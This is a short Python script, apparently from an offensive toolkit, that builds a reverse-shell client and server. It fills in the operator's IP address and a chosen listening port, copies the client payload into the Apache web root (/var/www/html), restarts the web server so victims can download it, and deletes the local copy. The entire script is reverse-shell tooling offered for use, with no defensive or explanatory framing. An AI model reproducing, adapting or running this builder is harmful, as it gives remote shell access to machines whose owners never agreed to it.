from subprocess import Popen, PIPE, call
import os

i = Popen('hostname -I', shell = True, stdout = PIPE)
inp = i.stdout.read().split('\n')[0].split(' ')[0]

port_inp = int(input('\n\n            Enter The Port To Listen On: '))

os.system('cp main/clients/rev_gen_client.py main/clients/reverse_client.py')
os.system('cp main/host/reverse_gen_server.py main/host/reverse_server.py')

f= open('main/clients/reverse_client.py','a')
f1=open('main/host/reverse_server.py','a')
f.write("ip_addr= '"+str(inp)+"'"+'\nport='+str(port_inp)+'\n\n'+'connect()')
f1.write('\nport='+str(port_inp)+'\n\n'+'connect()')
f1.close()
f.close()

os.system('cp main/clients/reverse_client.py /var/www/html; service apache2 restart; rm -rf main/clients/reverse_client.py')
